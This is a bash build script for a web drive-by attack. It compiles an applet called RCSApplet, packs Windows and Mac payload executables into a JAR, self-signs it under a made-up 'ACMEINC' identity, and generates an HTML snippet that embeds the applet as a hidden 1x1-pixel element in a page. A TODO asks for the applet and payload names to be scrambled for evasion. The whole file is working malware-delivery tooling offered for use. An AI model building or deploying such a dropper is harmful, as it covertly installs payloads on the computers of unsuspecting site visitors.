#!/bin/bash
#   To deploy, copy .jar and .cer file to the desired web location, and insert the following snippet
#   in the html code of the page.
#	
#       <applet code=RCSApplet.class archive="SignedHelloWorld.jar" width=1 height=1> 
#			<param name='first' value='<payload>' />
#		</applet>
#	
# 	change payload according to the payload name.
#
# TODO: scramble applet and payload names
#

NAME="RCSApplet"

# check arguments
if [ $# -ne 1 ] ; then
	echo "Usage: `basename $0` <payload>"
	exit 1
fi

PAYLOAD=$1

echo "[+] Using payload: $PAYLOAD"

# compile the applet source code to an executable class. 
javac $NAME.java
if [ $? -eq 1 ] ; then
    echo "Error with javac"
    exit
fi

echo "[+] Packaging the compiled class into a JAR file"
JAR_NAME="$NAME.jar"
jar cf $JAR_NAME $NAME.class
if [ $? -eq 1 ] ; then
    echo "Error with jar"
    exit
fi

echo "[+] Adding payload ($PAYLOAD) to JAR file"
if [ ! -f "$PAYLOAD.exe" ] ; then
	echo "Windows payload file '$PAYLOAD.exe' does not exists."
	exit
fi

if [ ! -f "$PAYLOAD" ] ; then
	echo "Mac payload file '$PAYLOAD' does not exists."
	exit
fi

zip -u $JAR_NAME "$PAYLOAD.exe"
zip -u $JAR_NAME "$PAYLOAD"
if [ $? -eq 1 ] ; then
    echo "Error with zip"
    exit
fi

# delete any old keystore
if [ -f mykeystore ] ; then
	rm mykeystore
fi

echo "[+] Generating key pairs"
keytool -genkey -alias signapplet -dname "CN=ACMEINC, O=Default, C=US" -validity 18250 -keystore mykeystore -keypass mykeypass -storepass mystorepass
if [ $? -eq 1 ] ; then
    echo "Error with generating the key pair"
    exit
fi

echo "[+] Signing JAR file 'S$NAME.jar'"
SIGNED_JAR_NAME="S$NAME.jar"
jarsigner -keystore mykeystore -storepass mystorepass -keypass mykeypass -signedjar  $SIGNED_JAR_NAME $JAR_NAME signapplet
if [ $? -eq 1 ] ; then
    echo "Error with signing the jar"
    exit
fi

echo "[+] Exporting the public key certificate"
keytool -export -keystore mykeystore -storepass mystorepass -alias signapplet -file mycertificate.cer
if [ $? -eq 1 ] ; then
    echo "Error with exporting the public key"
    exit
fi

echo "[+] Writing html snippet, to be inserted right after the <body> tag"

echo "<applet width='1' height='1' code=RCSApplet archive=$SIGNED_JAR_NAME >" > snippet.html
echo "<param name='first' value='$PAYLOAD'/></applet>" >> snippet.html

echo "[+] Done"
